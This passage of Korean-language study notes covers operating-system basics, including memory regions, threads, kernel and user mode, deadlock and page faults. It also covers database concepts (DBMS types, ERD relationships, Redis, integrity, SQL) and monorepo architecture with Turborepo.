  - 너무 빈번한 문맥 전환은 성능 저하를 초래할 수 있다.

  - 스레드 간 문맥 전환이 프로세스 간 문맥 전환보다 비용이 적다.

<br>

### # 코어

- 코어란 실제로 연산을 수행하는 CPU 내부의 처리 장치

- 옛날에는 CPU 1개 = 코어 1개였지만 요즘은 CPU 1개에 코어가 여러 개 들어 있어 동시에 여러 작업을 처리할 수 있다.

- 예 : 듀얼코어 2코어, 쿼드코어 4코어, 헥사코어 6코어, 옥타코어 8코아

<br>

### # 메모리 구조

- 메모리 구조

  - 프로그램이 실행되면 운영체제는 해당 프로세스를 위해 메모리를 아래와 같이 구분하여 할당.

  - 대부분의 시스템 언어나 네이티브 언어에서 공통적으로 적용되는 개념이지만 사용되는 언어의 추상화에 따라 동일하게 1:1로 적용되지는 않는다.

- 구분

  1. 코드 영역

  - 실행할 프로그램의 기계어 코드(Instructions)가 저장

  - 일반적으로 읽기 전용(Read-only)이며, 실행만 가능하고 수정은 불가능

  2. 데이터 영역

  - 초기화된 전역 변수와 정적(static) 변수가 저장

  - 프로그램 실행 전 컴파일 타임에 메모리 크기가 결정

  3. BSS 영역

  - 초기화되지 않은 전역 변수와 정적 변수가 저장됩니다.

  - 데이터 영역과 유사하지만 구분해서 관리된다.

  - 보통 데이터 영역과 함께 묶어서 "데이터 영역"이라 표현하기도 한다.

  4. 스택 영역

  - 지역 변수와 함수 매개변수가 저장된다.

  - 함수 호출 시 스택 프레임이 쌓이고, 함수 종료 시 자동으로 해제된다.

  - 컴파일 타임에 최대 크기가 정해지고, LIFO(후입선출) 방식으로 메모리를 관리한다.

  - 빠르고 자동으로 메모리를 관리하지만, 크기가 제한적이다.

  4. 힙 영역

  - 개발자가 명시적으로 동적 할당하는 메모리 공간입니다. (malloc, new 등)

  - 런타임에 크기가 결정되며, 명시적으로 해제하지 않으면 메모리 누수 발생 가능성이 있다.

  - 상대적으로 느리지만 유연하게 메모리를 사용할 수 있다.

<br>

### # 사용자 수준 스레드, 커널 수준 스레드, 혼합 스레드

- 스레드(Thread)

  스레드는 프로세스 내에서 실행 흐름의 최소 단위이다. 하나의 프로세스는 하나 이상의 스레드를 가질 수 있으며, 스레드끼리는 코드, 전역 변수, 힙 영역은 공유하고, 스택, 레지스터, 프로그램 카운터(PC) 등은 독립적으로 유지한다.

- 사용자 수준 스레드

  스레드가 사용자 영역에서 관리된다. 스레드 생성, 제거, 전환 등의 작업이 커널에 개입 없이 사용자 영역에서 수행된다. 일반적으로 스레드 라이브러리를 이용하여 구현되고 사용자 스레드 여러 개가 커널 스레드 하나에 매핑되므로 N:1 구조이다.

- 커널 수준 스레드

  스레드가 커널에서 직접 관리된다. 각 스레드는 커널 영역에 대응되는 커널 스레드와 1:1로 매핑된다.

- 혼합형 스레드

  사용자 수준 스레드와 커널 수준 스레드를 다대다(N:M)로 매핑하는 구조이다. 사용자 스레드는 커널 스레드 중 가용한 스레드에 매핑되어 실행된다.

<br>

### # CPU 권한 모드 중 커널모드, 유저모드의 차이

- 커널모드

  - 운영체제(OS)가 실행되는 모드로, CPU가 전체 시스템 자원에 대한 접근 권한을 가진다.

  - 메모리, 하드웨어, I/O 장치, CPU 제어 등 모든 명령을 실행 가능

  - 시스템 콜, 인터럽트 처리, 디바이스 드라이버 실행 등이 이 모드에서 수행

  - 보안 위험도는 크지만, 성능과 제어 측면에서 필수적인 영역

  - 예시 : OS 커널, 디바이스 드라이버, 파일 시스템, 네트워크 스택 등

- 유저모드

  - 일반적인 애플리케이션이 실행되는 모드

  - 직접적인 하드웨어나 시스템 자원 접근은 불가능하며, 제한된 권한만 가진다.

  - 시스템 자원이 필요한 경우, 시스템 콜을 통해 커널에게 요청하여 작업을 수행

  - 이렇게 제한함으로써 시스템 안정성과 보안이 확보

  - 예시 : 웹 브라우저, 게임, 텍스트 에디터, 사용자 애플리케이션 등

<br>

### # 스레드 세이프

멀티 스레드 환경에서 하나의 함수나 객체가 여러 스레드로부터 동시에 호출되더라도, 결과가 올바르게 동작하는 성질을 의미한다. 즉, 공유 자원에 대한 접근 시 동기화가 잘 되어 있어, 데이터 오염(race condition)이 발생하지 않고 예상한 대로 동작하는 것을 말한다.

<br>

### # 교착 상태(데드락)

- 교착 상태

  교착 상태란, 둘 이상의 프로세스가 서로 상대방이 보유한 자원을 기다리며 무한히 대기하게 되는 상태를 말한다. 이 상태에서는 각 프로세스가 더 이상 진행되지 않으며, 외부의 개입 없이는 절대 풀리지 않는다.

- 교착 상태 발생 조건 (아래 네 가지 조건을 모두 만족해야 교착 상태가 발생)

  - 상호 배제 : 자원은 동시에 여러 프로세스가 사용할 수 없고, 오직 하나의 프로세스만 자원을 점유할 수 있어야 한다.

  - 점유 대기 : 하나 이상의 자원을 점유한 상태에서, 다른 자원을 추가로 요청하며 대기하는 프로세스가 존재한다.

  - 비선점 : 이미 할당된 자원은 강제로 뺏을 수 없고, 오직 그 자원을 점유한 프로세스만 자원을 자발적으로 반납해야 한다.

  - 순환 대기 : 프로세스들이 원형으로 자원을 기다리는 상태이다. (예: P1 → R1 → P2 → R2 → P1 식으로 순환적인 대기가 존재)

<br>

### # 가상 메모리(Virtual Memory)

가상 메모리는 물리적 메모리(RAM)의 크기와 관계없이, 각 프로세스에 큰 연속된 메모리 공간을 제공하는 기술이다. CPU는 물리 주소가 아니라, 가상 주소(Virtual Address)를 사용하며, OS와 MMU가 이를 물리 주소로 매핑한다.

<br>

### # 페이지 폴트

페이지 폴트는 프로세스가 접근하려는 페이지가 물리 메모리에 없는 경우 발생하는 예외(Interrupt)이다. 이는 가상 메모리 시스템에서 흔하게 발생하며, 페이지 테이블의 유효 비트(Valid Bit)를 통해 감지된다.

<br>

### # DTO(Data Transfer Object)

- DTO는 데이터 전달 객체로, 주로 서로 다른 계층 또는 프로세스 간에 데이터를 전송할 때 사용되는 객체이다.

- 비즈니스 로직을 포함하지 않고, 단순히 데이터를 담기 위한 구조체(객체)이다.

- 데이터의 타입, 필수 여부, 옵션 등을 명확히 정의하여 데이터의 유효성 검증 및 명확한 인터페이스 역할을 수행한다.

- 예를 들어, API 요청이나 응답 시 데이터 형식을 정의할 때 자주 활용된다.

<br>

### # PCB(Process Control Block)에 저장되는 정보

1. 프로세스 식별자 (Process ID): 프로세스의 고유 번호

2. 프로세스 상태: 준비(Ready), 실행(Running), 대기(Waiting) 등 현재 상태

3. 프로그램 카운터(PC): 다음에 실행할 명령어 주소

4. CPU 레지스터 상태: 현재 작업에 필요한 CPU 레지스터 값들

5. CPU 스케줄링 정보: 우선순위, 스케줄링 큐 위치 등

6. 메모리 관리 정보: 페이지 테이블, 세그먼트 테이블 등 메모리 주소 관련 정보

7. I/O 상태 정보 및 열린 파일 목록: 프로세스가 사용하는 입출력 장치 및 열린 파일 리스트

8. 계정 정보 및 기타 관리 정보 (필요한 경우): 사용자 ID, 그룹 ID, CPU 사용 시간 등

<br>

### # CQRS, 이벤트 소싱

- CQRS

  - 개념: 명령(Command)과 조회(Query)를 분리하는 아키텍처 패턴이다.

  - 명령(Command): 시스템 상태를 변경하는 작업 (예: 생성, 수정, 삭제)

  - 조회(Query): 시스템 상태를 읽는 작업

  - 이렇게 역할을 분리하면 각 작업에 최적화된 모델과 데이터 저장소를 사용할 수 있고, 확장성, 성능, 유지보수성 향상에 도움이 된다.

- 이벤트 소싱

  - 개념: 시스템 상태를 직접 저장하지 않고, 상태 변화를 일으킨 이벤트(사건)들을 순차적으로 저장하는 방식이다.

  - 시스템 상태는 저장된 이벤트들을 재생(replay)하여 계산된다.

  - 이벤트들은 불변(immutable)하며, 이력을 모두 저장하므로 감사(audit), 복구, 시간 여행 등 기능 구현에 유리하다

<br><br><br>

## # Data Base

<br>

### # 데이터베이스

- 데이터베이스(Database)

  컴퓨터 시스템에 저장된 정보를 체계적으로 모아 놓은 데이터의 집합이며, 여러 사용자와 애플리케이션이 데이터를 효율적으로 저장, 검색, 수정할 수 있도록 관리하는 시스템

- 데이터베이스 사용 이유

  1. 영속성: 메모리에 저장된 데이터는 프로그램 종료 시 사라지지만, 데이터베이스는 데이터를 영구적으로 저장하여 보존한다.

  2. 데이터 무결성 및 일관성 보장 : 무결성(데이터가 정확하고 신뢰할 수 있는 상태를 유지하는 것), 일관성(데이터베이스 트랜잭션이 완료된 후 데이터가 항상 일관된 상태를 유지하는 것)

  3. 효율적인 데이터 관리: 대량의 데이터를 구조적으로 저장하고 빠르게 조회할 수 있음

  4. 동시성 제어: 여러 사용자가 동시에 데이터에 접근할 때 충돌을 방지

  5. 보안 및 접근 제어: 권한에 따라 데이터 접근 제한 가능

- 메모리와 프로세스, 데이터베이스 관계 정리 (위 영속성 관련 추가 설명)

  1. 프로그램 실행 → 프로세스 생성

     - 우리가 어떤 프로그램을 실행하면, 운영체제는 그 프로그램을 프로세스로 만든다.

     - 이 때 RAM(주기억장치)의 일부를 그 프로세스에게 할당한다.

  2. 프로세스가 사용하는 메모리 종류

     - 코드 영역: 실행할 명령어(함수, 제어 흐름 등)

     - 데이터 영역: 전역 변수, static 변수

     - 힙 영역: 동적으로 생성된 데이터 (예: new, malloc)

     - 스택 영역: 함수 호출 시 지역 변수, 매개변수 등

  3. 프로세스 종료 → 메모리 반납

     - 프로세스가 종료되면 운영체제가 해당 프로세스에게 할당했던 모든 메모리 공간을 해제해요.

     - 즉, 그 안에 있던 데이터는 모두 사라집니다.

  그렇기 때문에 데이터를 안전하게 보존하기 위해 데이터베이스를 사용한다. 많은 프로그램은 실행 중에는 DB에서 데이터를 메모리로 가져와서 사용하고, 변경 사항은 다시 DB에 저장하는 흐름을 사용한다.

<br>

### # DBMS(Database Management System, 데이터베이스 관리 시스템)

- DBMS란?

  데이터베이스를 ‘데이터의 집합’이라고 정의한다면, 이런 데이터베이스를 생성, 운영, 관리할 수 있도록 도와주는 소프트웨어를 DBMS(Database Management System)라고 힌디.
  대부분의 현대 DBMS는 테이블 기반의 관계형 DBMS(RDBMS)이며, 이 외에도 계층형, 망형, 객체지향형 등 다양한 구조가 있다.

- 대표적인 DBMS 종류

  데이터베이스를 사용하기 위해서도 소프트웨어, 즉 DBMS를 설치해야 하는데 대표적으로 MySQL, 오라클(Oracle), SQL 서버, MariaDB 등이 있습니다.

  | DBMS       | 제작사     | 작동 운영체제             | 기타                                           |
  | :--------- | :--------- | :------------------------ | :--------------------------------------------- |
  | MySQL      | Oracle     | Unix, Linux, Windows, Mac | 오픈 소스(무료), 상용                          |
  | MariaDB    | MariaDB    | Unix, Linux, Windows      | 오픈 소스(무료), 초기 개발자들이 독립해서 만듦 |
  | PostgreSQL | PostgreSQL | Unix, Linux, Windows, Mac | 오픈 소스(무료)                                |
  | Oracle     | Oracle     | Unix, Linux, Windows      | 상용 시장 점유율 1위                           |
  | SQL Server | Microsoft  | Windows                   | 주로 중/대형급 시장에서 사용                   |
  | DB2        | IBM        | Unix, Linux, Windows      | 메인프레임 시장 점유율 1위                     |
  | Access     | Microsoft  | Windows                   | PC용                                           |
  | SQLite     | SQLite     | Android, iOS              | 모바일 전용, 오픈 소스(무료)                   |

<br>

- DBMS 분류

  - DBMS의 유형은 계층형(Hierarchical), 망형(Network), 관계형(Relational), 객체지향형(Object-Oriented), 객체관계형(Object-Relational) 등으로 분류됩니다. 현재 사용되는 DBMS 중에는 관계형 DBMS가 가장 많은 부분을 차지하며, MySQL도 관계형 DBMS에 포함됩니다.

  - 계층형 DBMS : 계층형 DBMS(Hierarchical DBMS)는 처음으로 등장한 DBMS 개념으로 1960년대에 시작되었다. 아래 그림과 같이 각 계층은 트리tree 형태를 갖습니다. 사장 1명에 이사 3명이 연결되어 있는 구조이다. 계층형 DBMS의 문제는 처음 구성을 완료한 후에 이를 변경하기가 상당히 까다롭다는 것이다. 또한 다른 구성원을 찾아가는 것이 비효율적이다. 예를 들어 재무2팀에서 회계팀으로 연결하려면 재무이사 → 사장 → 회계이사 → 회계팀과 같이 여러 단계를 거쳐야 한다. 지금은 사용하지 않는 형태이다.

    ![데이터베이스_계층형DBMS](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/5caea3a1-703a-407b-8cd8-9bd684e9c9c9)

  - 망형 DBMS : 망형 DBMS(Network DBMS)는 계층형 DBMS의 문제점을 개선하기 위해 1970년대에 등장했다. 다음 그림을 보면 하위에 있는 구성원끼리도 연결된 유연한 구조이다. 예를 들어 재무2팀에서 바로 회계팀으로 연결이 가능하다. 하지만 망형 DBMS를 잘 활용하려면 프로그래머가 모든 구조를 이해해야만 프로그램 작성이 가능하다는 단점이 존재한다. 역시 지금은 거의 사용하지 않는 형태이다.

    ![데이터베이스_망형DBMS](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/65ea40a3-0a60-4837-b568-3deb8f4ab2bb)

  - 관계형 DBMS : 관계형 DBMS(Relational DBMS)는 줄여서 RDBMS라고 부른다. MySQL뿐만 아니라, 대부분의 DBMS가 RDBMS 형태로 사용된다. RDBMS의 데이터베이스는 테이블(table)이라는 최소 단위로 구성되며, 이 테이블은 하나 이상의 열(column)과 행(row)으로 이루어져 있다. RDBMS에서는 모든 데이터가 테이블에 저장된다. 이 구조가 가장 기본적이고 중요한 구성이기 때문에 RDBMS는 테이블로 이루어져 있으며, 테이블은 열과 행으로 구성되어 있다는 것을 파악했다면 RDBMS를 어느정도 이해했다고 할 수 있다.

    ![데이터베이스_sql_table](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/0e9935c2-82b3-4709-85cc-d04f8ae291f7)

<br>

### # 관계형 데이터베이스(relational database)

- 관계형 데이터베이스(Relational Database)

  데이터 사이의 관계에 기초를 둔 데이터베이스 시스템을 말하고 2차원 테이블로 표현한다. 원투원(두 테이블이 서로가 서로의 오로지 한 로우에만 연결),
  원투매니(한 테이블의 로우 하나에 다른 테이블의 로우 여러개가 연결), 매니투매니(중간테이블로 연결, 하나에 다른 테이블의 로우 여러개가 연결)의 관계로 테이블을 연결하며 식별 정보를
  나타내는 프라이머리 키와 테이블 관계를 나타내는 폴인 키를 활용하여 각 테이블의 값을 참조한다.

- 관계형 데이터베이스 매니지먼트 시스템(RDBMS, Relational DataBase Managenet System)

  관계형 데이터베이스 매니지먼트 시스템은 관계형 데이터베이스를 생성, 수정, 관리하는 소프트웨어

<br>

### # ERD(Entity-Relationship)

- ERD란?

  개체(Entity)-관계(Relationship) 모델이다. 테이블 간의 관계를 설명해주는 다이어그램 이라 보면 된다.

- ERD의 3요소

  - 개체(Entity)

    ![database_erd_01](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/4ae80056-4e04-4604-8034-8d68aae4bd1d)

    - 데이터베이스 분야에서 개체란 데이터베이스에 데이터로 표현하려고 하는 현실 세계의 대상체

    - 개체는 현실 세계에 대해 사람이 생각하는 개념과 정보의 단위로서 의미를 지닌다

    - 개체는 독립적인 특성을 갖는다

    - 관리 대상이 되는 정보를 갖고 있는 사람, 사물, 사건, 개념 등을 의미하고 일반적으로 명사형으로 표현

    - 데이터베이스에서는 하나의 entity의 속성을 저장하기 위해 한 개 이상의 테이블을 사용한다. 그리고 그 테이블의 주제를 entity라고 표현한다.

    - 엔티티는 후에 데이터베이스의 테이블로 전환된다.

  - 속성 (Attribute)

    ![database_erd_02](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/6892d468-7c38-4852-b16c-51640809ea30)

    - 속성은 저장할 필요가 있는 개체(Entity)에 관한 정보를 의미하며, 파일 구조상 데이터 필드(항목)에 해당

    - 데이터베이스를 구성하는 최초의 논리적 단위다.

    - 하나의 개체는 한 개 이상의 속성으로 구성되고 각 속성은 개체의 특성, 상태 등을 기술한다.

    - 속성은 후에 데이터베이스 테이블의 컬럼이 된다.

    - 속성은 개체가 가지고 있는 속성을 의미한다.

    - ERD에서는 속성을 "원"으로 표기한다.

    - 속성 중 "기본키"는 속성에 밑줄을 그어 표기한다.

  - 관계 (Relationship)

    ![database_erd_03](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/8c9d53f4-296a-4d6b-a595-ce4e2254483c)

    - 개체간의 연관성을 관계라고 하며, 일반적으로 동사형으로 표현된다.

    - 예를 들어 부서와 사원이라는 두 개의 엔티티가 관계를 가지고 있다면 이 하나의 관계는 포함한다, 소속된다라는 2개의 현재형으로 표현한 관계를 가진다.

    - 논리적 데이터 모델링에서, Entity에서 포함시키고 싶은 다른 Entity의 Primary Key(PK, 기본키)를 Foreign Key(FK, 외래키)로서 두고, SQL문의 JOIN 기능을 이용하여 이 FK를 조건으로 하여, 일치하는 PK를 가진 data를 해당 Entity에서 참조하여 사용.

    - 관계는 개체 간의 관계를 의미한다.

    - ERD에선 개체를 서로 이으며 어떤 관계를 가지는지 "마름모"로 표기한다.

- ERD의 표기법

  - 피터첸 표기법

    ![database_erd_04](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/d08788c9-b52b-4633-a876-1967b860e4df)

  - 정보공학 표기법

    ![database_erd_05](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/a45ebac7-c6e9-4e69-9b8b-d6b077985480)

    - One

      일대일 혹은 일대다 관계이다. 주로 하나의 외래키가 걸린 관계라도 보면 된다.

    - Many

      다대다 관계이다. 중계 테이블을 통하여 여러개의 데이터를 바라보고 있을 때 사용한다.

    - One (and only one)

      위의 조건과 동일하게 일대일 관계이나, 하나의 row 끼리만 연결된 데이터이다.

    - Zero or one

      일대일 혹은 일대다 관계를 가지고 있으나, 필수 조건이 아님을 의미한다.

    - One or many

      일대일 혹은 다대다 관계를 가지고 있음을 의미한다. 관계를 가지고 있으나, 참조되는 row 값들이 불명확함을 의미한다.

    - Zero or many

      참조하는 테이블과의 관계가 불명확한 경우이다. 장바구니처럼 row 생성값이 없을수도, 하나일수도, 여러개일 수도 있는 경우이다.

- ERD의 관계(Relationship) 차수

  - 관계 차수란

    두 개의 엔티티 관계에서 참여자의 수를 표현하는 것을 관계차수라고 한다. 가장 일반적인 관계차수 표현방법은 1:1, 1:N, N:N이다.

  - 관계 차수 키의 종류

    - 기본 키(PK, Primary Key)

      테이블 내에서 각 행을 유일하게 식별할 수 있는 컬럼

    - 외래 키(FK, Foreign Key)

      다른 테이블의 기본 키를 참조하여 관계를 나타냄

  - 관계 차수 종류

    - 일대일 1:1(one to one)

      - 한 테이블의 한 행(row)이 다른 테이블의 한 행과만 연결됨

      - 예: 사용자 ↔ 여권

        - 테이블 구조

          ```md
          User

          - id (PK)
          - name

          Passport

          - id (PK)
          - user_id (FK → User.id, UNIQUE)
          - passport_number
          ```

        - 관계 도식

          ```md
          User (1) ←──→ (1) Passport
          ```

    - 일대다 1:N(one to many)

      - 한 테이블의 한 행이 다른 테이블의 여러 행과 연결됨

      - 예: 블로그(Blog) ↔ 게시글(Post)

        - 한 블로그에는 여러 개의 게시글이 있음

        - 하나의 게시글은 하나의 블로그에만 속함

        - 테이블 구조

          ```md
          Blog

          - id (PK)
          - title

          Post

          - id (PK)
          - blog_id (FK → Blog.id)
          - content
          ```

        - 관계 도식

          ```md
          Blog (1) ←─── (N) Post
          ```

    - 다대다 N:M(many to mamy)

      - 두 테이블의 여러 행이 서로 다수와 연결됨

      - 이를 구현하기 위해 중간 테이블(조인 테이블)을 사용

      - 예: 학생(Student) ↔ 강의(Course)

        - 한 학생은 여러 강의를 수강할 수 있음

        - 한 강의는 여러 학생이 수강할 수 있음

        - 테이블 구조

          ```md
          Student

          - id (PK)
          - name

          Course

          - id (PK)
          - title

          Enrollment -- 중간 테이블

          - student_id (FK → Student.id)
          - course_id (FK → Course.id)
          - enrollment_date
          ```

        - 관계 도식

          ```
          Student (N) ←───▶ Enrollment ◀───▶ (N) Course
          ```

- ERD 설계 단계

  - 요구사항 분석

    DB 사용 환경 분석 후 데이터베이스로 관리할 대상 및 제한 조건 도출

  - 개념적 설계

    ![database_erd_06](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/8a4f4d62-e829-428e-9640-91bd12909b9e)

    분석 결과를 추상화된 표현 방식으로 기술 → 개념적 스키마 생성

  - 논리적 설계

    ![database_erd_07](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/fea4a3c3-8f18-4f88-bf8e-579eceda2090)

    논리적 데이터베이스 구조에 맞는 스키마 생성 → 논리적 스키마 생성

  - 물리적 설계

    ![database_erd_08](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/5b71b8ae-12f7-4323-a368-35080153883b)

    실제 컴퓨터에 저장되는 효율적이고 구현가능한 물리적 구조 설계

- ERD(Entity-Relationship) 작성

  1. 엔터티를 그린다.

  2. 엔터티를 적절하게 배치한다.

  3. 엔터티간 관계를 설정한다

     - 기본 키로 속성이 상속되는 식별자 관계를 설정한다.

     - 중복되는 관계가 있으면 안된다.

     - Circle 관계가 발생하면 안된다.

  4. 관계명을 기술한다.

     - 현재형을 사용한다.

     - 지나치게 포괄적인 용어는 사용하지 않는다.

     - 정보공학 표기법에서는 링크마다 각각의 관계를 기술한다.

  5. 관계의 참여도를 기술한다.

  6. 관계의 필수여부를 기술한다.

<br>

### # 메모리 데이터베이스

- 개념

  - 데이터를 메모리에 저장하는 데이터베이스.

  - 구조는 일반 DB처럼 키-값 형태, 리스트, 해시 등으로 저장 가능하지만

  - 실제 저장 위치가 RAM이기 때문에 속도가 매우 빠름.

- Redis란?

  - 가장 널리 쓰이는 인메모리 데이터베이스

  - 캐시용으로 많이 쓰지만, 영속 저장도 가능 (옵션에 따라 디스크에 저장 가능)

- 용도 예시

  - 로그인한 사용자 세션 저장

  - 요청 수 제한(Throttle) 체크

  - 짧은 기간 동안만 유효한 임시 데이터 저장 (ex. 인증 코드)

  - 실시간 순위표, 메시지 큐 등 빠른 데이터 처리가 필요한 기능

- 차이 정리

  | 구분      | 일반 DB (MySQL 등) | 캐시 (메모리 내 임시 저장) | Redis (메모리 DB)          |
  | --------- | ------------------ | -------------------------- | -------------------------- |
  | 저장 위치 | 디스크             | 메모리(RAM)                | 메모리(RAM, + 디스크 옵션) |
  | 속도      | 느림               | 매우 빠름                  | 매우 빠름                  |
  | 영속성    | O (지속 저장)      | X (보통 휘발성)            | 옵션에 따라 O              |
  | 활용 목적 | 핵심 데이터 저장   | 속도 향상                  | 캐시 + 세션 + 키-값 DB 등  |

- 요약

  - 캐시 : 자주 쓰는 데이터를 임시로 RAM에 저장 → 속도 ↑

  - Redis : RAM을 사용하는 빠른 DB → 속도 + 유연성

  - 둘 다 메모리를 쓰지만, 목적과 관리 방식이 다름

<br>

### # 데이터 무결성, 데이터 일관성

- 데이터 무결성 (Data Integrity)

  - 개념

    데이터가 정확하고 신뢰할 수 있는 상태를 유지하는 것, 무결성을 유지하는 것은 데이터가 잘못 입력되거나 손상되면 시스템 전체가 잘못된 정보를 바탕으로 동작할 수 있기 때문에 매우 중요하다.

  - 종류

    - 개체 무결성(Entity Integrity): 각 행(row)에는 고유한 기본키(primary key)가 반드시 존재해야 함

    - 참조 무결성(Referential Integrity): 외래키(foreign key) 관계가 올바르게 유지되어야 함 — 즉, 참조하는 값이 항상 존재해야 함

    - 도메인 무결성(Domain Integrity): 컬럼에 허용되는 값의 형식, 범위, 제약 조건이 지켜져야 함 (예: 나이는 0 이상, 이메일 형식 등)

    - 사용자 정의 무결성(User-defined Integrity): 비즈니스 규칙에 따른 데이터 조건

- 데이터 일관성 (Consistency)

  - 개념

    데이터베이스 트랜잭션이 완료된 후 데이터가 항상 일관된 상태를 유지하는 것, 즉 데이터베이스에 허용된 규칙(무결성 제약조건, 트랜잭션(여러 작업) 규칙 등)을 항상 만족하는 상태

  - 예시: 은행 계좌 이체 트랜잭션에서 돈이 송금자 계좌에서 차감되고 수취인 계좌에 정확히 더해져야 하며, 중간에 한 쪽만 처리되는 일이 없어야 함

- 무결성은 데이터가 올바르게 저장되고 유지되는 ‘정확성’에 초점, 일관성은 여러 작업(트랜잭션) 후에도 데이터가 ‘정해진 규칙을 지키고 있는 상태’를 뜻함

<br>

### # 정규화

정규화는 데이터베이스 설계 과정에서 중복을 최소화하고, 데이터 무결성을 유지하며, 삽입, 수정, 삭제 이상(anomaly)을 방지하기 위해 테이블을 여러 개로 분해하는 과정이다.

<br>

### # 인덱스

인덱스는 데이터베이스에서 검색 성능을 향상시키기 위해 사용하는 자료구조이다. 마치 책의 목차처럼, 테이블의 특정 열(Column)에 대한 정보를 미리 정렬하여 저장해두는 구조이다.

<br>

### # SQL

SQL은 Structured Query Language의 약자로, 관계형 데이터베이스(RDBMS)를 조작하고 질의(Query)하기 위한 언어이다. 데이터베이스와의 소통 언어로, 데이터를 조회, 삽입, 수정, 삭제하는 데 사용하며 절차형 언어가 아닌 선언형 언어이다. 어떻게가 아니라 무엇을 할지 기술한다.
SQL은 국제표준화기구(ISO)에서 정의한 표준 SQL(SQL Standard)이 존재하며 주요 DBMS는 이 표준을 기본적으로 따르며, 필요에 따라 자체 확장된 문법을 포함하기도 한다.
따라서 표준 SQL만 잘 익혀도 대부분의 DBMS에 적용 가능하며, 각 제품의 전용 문법은 상황에 맞게 학습하면 된다.

| DBMS       | 확장 SQL 이름 | 특징                          |
| ---------- | ------------- | ----------------------------- |
| Oracle     | PL/SQL        | Oracle 전용의 프로그래밍 확장 |
| SQL Server | T-SQL         | Microsoft SQL Server용 확장   |
| MySQL      | (기본 SQL)    | 표준 SQL + MySQL 전용 함수 등 |

<br><br><br>

## # Architecture

<br>

### # 모노레포(Monorepo) 구성을 위한 터보레포(Turborepo)

- 프로젝트 구성 방식

  - 모놀리식(Monolithic)

    - 개념

      최초의 모놀리식 방식은 애플리케이션의 모든 기능이 하나의 프로젝트 안에서 함께 개발되고 배포되는 구조를 말한다. 모든 코드가 단일 코드베이스로 구성되며, 서로 직접 의존한다.

    - 장점

      1. 코드 재사용이 쉽다.

      2. 빌드 및 배포 과정이 단순해 소수의 개발자가 빠르게 개발할 수 있다.

    - 단점

      1. 관심사 분리가 어렵다.

      2. 하나의 기능을 변경해도 전체 애플리케이션을 다시 빌드하고 배포해야 하는 등 유지보수가 어렵다는 단점이 있다.

  - 멀티레포(Multi-Repo)

    - 개념

      멀티레포는 기능별 또는 도메인별로 소스 코드를 모듈화하고, 각 모듈을 별도의 저장소로 관리하는 구조이다.

    - 장점

      1. 관심사 분리가 쉽다.

      2. 각 모듈이 독립적으로 개발, 테스트, 배포될 수 있어 팀 단위의 작업 분리가 용이하다.

    - 단점

      1. 저장소가 분산되어 있기 때문에 코드 공유와 일관된 컨벤션 유지가 어렵다.

      2. 의존성 관리 및 버전 충돌 등으로 인해 빌드와 배포가 복잡해질 수 있다.

  - 모노레포(Mono-Repo)

    - 개념

      모노레포는 여러 개의 프로젝트(또는 패키지)를 하나의 저장소에 함께 관리하는 구조로, 멀티레포의 관심사 분리 장점과 모놀리식의 일관된 개발 환경을 모두 지향한다.
      모노레포의 대표적인 장점은 다음과 같다. `모노레포`는 이와 같은 모놀리식 레파지토리와 멀티레포의 장점을 모두 취하고자 등장했다. 노레포 구성을 도와주는 프레임워크는 Lerna, yarn workspace, Nx, Turborepo 등이 있다.

    - 장점

      1. 프로젝트 파악 수월 : 모든 커밋과 변경 이력이 하나의 저장소에 남기 때문에, 히스토리를 추적하거나 전체 구조를 이해하기 쉽다.

      2. 코드 재사용성 증가 : 공통 코드(예: 유틸 함수, 컴포넌트, 테스트 도구 등)를 하나의 패키지로 관리하며 여러 프로젝트에서 쉽게 사용할 수 있다.

      3. 배포, 빌드, 테스트 속도 향상 : 작업을 병렬로 실행하거나 변경된 프로젝트만 선별적으로 처리할 수 있어 효율적이다.

    - 단점

      1. 초기 설정과 관리가 복잡하다 : 여러 프로젝트를 한 저장소에 관리하려면 빌드 도구, 의존성 관리, 배포 파이프라인을 잘 설계해야 해서 초기 세팅이 까다롭고 복잡할 수 있다.

      2. 대형 저장소로 인한 성능 문제 : 커밋, 검색, 빌드 시 전체 저장소 크기가 커지면 속도가 느려질 수 있다. 특히 Git 히스토리 관리나 CI/CD 빌드 시간이 오래 걸릴 수 있다.

      3. 권한 관리 어려움 : 저장소가 하나라서, 특정 프로젝트나 팀 단위로 권한을 세분화하기가 어렵다. 민감한 프로젝트가 섞여있으면 보안 이슈가 될 수 있다.

      4. 코드 변경 영향 범위 파악 어려움 : 큰 저장소 내에서 공유되고 있는 한 부분을 변경하면 어떤 프로젝트에 영향이 있을지 정확히 파악하기 어려울 수 있다.

- 터포레포(Turborepo)

  - 터포레포(Turborepo)란?

    Vercel이 인수한 Turborepo는 JavaScript와 TypeScript 코드 베이스의 모노레포를 위한 고성능 빌드 시스템이다. Vercel과 AWS, Miro, PayPal, Discord,
    LINE+의 Universal Video Player 등 여러 프로젝트에서 프로덕션 단계로 사용하고 있으며 지금도 활발하게 개발이 진행되고 있다.

    Turborepo의 주요 미션은 모노레포 환경에서 개발자가 조금 더 쉽고 빠르게 개발할 수 있도록 빌드 도구를 제공하는 것이다. 고급 빌드 시스템을 구축하는 복잡한 과정을
    Turborepo가 대신해 주기 때문에 개발자는 복잡한 설정과 스크립트에 신경 쓰는 대신 개발에 더 집중할 수 있다. Turborepo의 기본 원칙은 한 번 작업을 수행하며
    수행한 계산은 이후 다시 수행하지 않는 것이다. 따라서 두 번째 실행할 때는 이전에 계산한 작업은 건너뛰고 이전에 캐싱해 놓은 로그를 다시 보여준다.

  - 터보레포 특징

    1. 빠른 빌드 속도(Incremental builds) : 작업 결과를 캐싱해서 이미 처리된 부분은 다시 빌드하지 않는다. 빌드를 한 번만 수행하는 것을 목표로 한다.

    2. 빌드 시 변경된 부분만 처리(Content-aware hasing) : 파일 변경 여부를 타임스탬프가 아닌 실제 파일 콘텐츠 기반으로 판단한다. 따라서 변경된 파일만 빌드하여 불필요한 재빌드를 방지한다.

